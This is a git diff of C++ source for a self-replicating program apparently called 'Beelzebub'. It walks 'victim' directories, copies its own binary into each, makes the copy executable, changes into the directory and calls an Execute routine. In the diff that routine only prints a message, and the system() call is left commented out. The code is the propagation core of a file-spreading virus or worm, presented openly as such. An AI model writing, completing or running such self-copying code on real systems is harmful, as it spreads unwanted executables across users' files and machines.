@@ -6,6 +6,7 @@
 
 #include <sys/stat.h> 
 #include <sys/types.h>
+#include<unistd.h> 
 
 
 #include "lib/list.hpp"
@@ -29,6 +30,8 @@ void Make_exe(const char * head);
 bool Is_dir(const char * path);
 
 void Execute(const char * head_path);
+
+void Change_current_working_directory(const char * path);
 
 int main()
 {
@@ -86,13 +89,19 @@ int main()
 
 	    	else
 	    	{
+
+	    		Change_current_working_directory(victim);
+
 	    		std::string nh_path = victim;
 	    		nh_path += "/";
+
 	    		nh_path += HEAD;
 	    		const char *new_head = nh_path.c_str();
 	    		copy_binary(HEAD,new_head);
 	    		Make_exe(new_head);
-	    		Execute(new_head);
+
+	    		Execute("./Beelzebub");
+	    		Change_current_working_directory("..");
 
 	    	}
 		}
@@ -120,9 +129,13 @@ int main()
 
 	copy_binary(HEAD, new_head);
 
+
+
 	Make_exe(new_head);
 
-	//Execute(new_head);
+	Change_current_working_directory("../");
+	
+	Execute(new_head);
 
 	return 0;
 }
@@ -131,6 +144,15 @@ int main()
 
 
 // FUNCTION DEFINITIONS
+void Change_current_working_directory(const char * path)
+{
+
+	//char cd[100];
+	chdir(path);
+
+	//std::cout<<"current working directory: "<<getcwd(cd,100)<<std::endl;
+}
+
 
 bool Is_dir(const char * path)
 {
@@ -163,6 +185,7 @@ void Make_exe(const char * head)
 void Execute(const char * head_path)
 {
 	std::cout<<"Executing "<<head_path<<std::endl;
+	//system(head_path);
 
 
 }
